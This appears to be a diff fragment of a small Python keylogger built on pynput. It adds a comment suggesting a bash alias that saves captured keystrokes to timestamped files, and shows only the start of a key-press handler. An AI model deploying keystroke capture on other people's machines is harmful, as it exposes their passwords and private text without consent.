@@ -1,5 +1,6 @@
 #sudo apt-get install python3-tk python3-dev
-#rm keystrokes_*
+#recommended adding a similar alias to ~/.bash_aliases:
+#alias dump_kl='python3 /home/roman/LAB/gadgets/keyLgLite2.py > "keys_$(date +%d.%m.%Y_%H.%M).txt"'
 from pynput.keyboard import Key, Listener
 
 def on_press(key):
